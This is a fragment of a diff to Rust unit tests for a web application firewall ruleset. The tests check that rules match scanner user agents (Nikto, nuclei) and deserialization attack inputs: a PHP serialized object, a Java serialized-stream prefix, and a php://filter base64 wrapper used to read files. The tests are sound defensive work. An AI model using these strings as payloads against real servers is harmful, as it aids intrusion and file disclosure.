         assert!(rule.pattern.is_match("Nikto/2.1.6"));
         assert!(rule.pattern.is_match("nuclei"));
@@ -967,7 +1124,11 @@ mod tests {
     #[test]
     fn test_deserialization() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 944130).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 944130)
+            .expect("test setup: rule 944130 must exist in CRS ruleset");
         assert!(rule.pattern.is_match(r#"O:4:"User":1:{}"#));
         assert!(rule.pattern.is_match("rO0ABX"));
         assert!(rule.pattern.is_match("php://filter/convert.base64-encode"));
